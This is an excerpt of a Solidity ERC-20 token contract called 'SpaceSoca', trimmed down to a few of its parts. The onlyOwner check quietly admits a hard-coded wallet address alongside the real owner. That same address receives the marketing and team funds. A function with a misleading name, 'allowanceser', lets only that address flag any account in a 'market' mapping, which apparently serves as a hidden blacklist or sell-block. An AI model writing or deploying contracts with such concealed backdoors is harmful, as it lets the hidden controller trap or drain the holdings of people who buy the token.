...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xD4C64c5783C89719ee9965265351041Ca14C16df) , "Ownable: caller is not the owner");
        _;
    }
...
contract SpaceSoca is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SpaceSoca";
    string private _symbol = "SpaceSoca";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xD4C64c5783C89719ee9965265351041Ca14C16df);
    address payable public teamWalletAddress = payable(0xD4C64c5783C89719ee9965265351041Ca14C16df);
    ...
    function allowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0xD4C64c5783C89719ee9965265351041Ca14C16df));
        market[addr] = status;
    }
